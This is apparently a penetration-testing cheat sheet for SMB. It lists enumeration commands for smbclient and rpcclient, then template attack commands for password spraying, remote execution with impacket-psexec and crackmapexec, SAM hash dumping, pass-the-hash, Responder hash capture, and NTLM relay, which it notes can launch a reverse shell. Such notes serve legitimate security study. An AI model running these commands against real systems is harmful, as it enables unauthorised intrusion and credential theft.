# SMB

The Server Message Block (SMB) is a client-server protocol that regulates access to files and directories as well as other network resources such as printers and routers. It is mainly used by Windows machines, but there is also the software Samba that makes it available for Linux and Unix.

## SMBClient
__Command:__ ```smbclient <options> //<target>```

### Options
- ```-U```: Specify username
- ```--password=<password>```: Specify password
- ```-N```: Don't ask for password
- ```-L```: Get list of shares available on host  

More options available with ```--help``` flag.

Execute local commands by appending ! to the start of each command.

__Show status:__ ```smbstatus```

## RPCClient
Useful for obtaining further information about an SMB server that could not be found in initial Nmap scan.

__Command:__ ```rpcclient -U "" <target> ```

### Useful commands
- ```srvinfo```: Server information.
- ```enumdomains```: Enumerate all domains that are deployed in the network.
- ```querydominfo```: Provides domain, server, and user information of deployed domains.
- ```netshareenumall```: Enumerates all available shares.
- ``` netsharegetinfo <share>```: Provides information about a specific share.
- ```enumdomusers```: Enumerates all domain users.
- ```queryuser <RID>```: Provides information about a specific use

Brute force user RIDs using the tool ```samrdump.py```.

Alternative tools for obtaining similar information about an SMB server include __SMBMap__, __CrackMapExec__, and __enum4linux-ng__.

## Attacks
### Anonymous authentication
If anonymous authentication is enabled, shares can be accessed with no credentials.

### Brute forcing & password spraying
Brute force using the tools Hydra or Medusa. Perform password spraying using CrackMapExec.

### Remote code execution
PsExec is a tool that can be used to execute processes on other systems without having to install client software manually. It is implemented for Linux as part of the tools __Impacket PsExec__ and __CrackMapExec__.

__Impacket PsExec__   
Command: ```impacket-psexec <user>:<password>@<target>```, where ```user``` and ```password``` belong to a local administrator.

__CrackMapExec__  
Command: ```crackmapexec smb <target> -u <user> -p <password> -x 'whoami' --exec-method smbexec```

### Enumerating logged-on users
Command: ```crackmapexec smb <target> -u <user> -p <password> --loggedon-users```

### Exteract hashes from SAM database
Command: ```crackmapexec smb <target> -u <user> -p <password> --sam```

If a hash cannot be cracked, it can still be used to authenticate over SMB using the technique Pass-the-Hash (PtH). Example command: ```crackmapexec smb <target> -u <user> -p <password> -H <hash>``

### Forced authentication attacks
Create a fake SMB server to capture users' hashes. The most common tool used for this is __Responder__.

Command: ```responder -I <interface name>```

If the hash cannot be cracked, it can be rekayed to another machine using __impacket-ntlmrelayx__ or __Responder MultiRelay.py__. 

Example command using  __impacket-ntlmrelayx__: ```impacket-ntlmrelayx --no-http-server -smb2support -t <target>```. This will dump the SAM database by default, but commands (such as starting a PowerShell reverse shell) can be executed by adding the option ```-c```. Then set up a listener to obtain the reverse shell.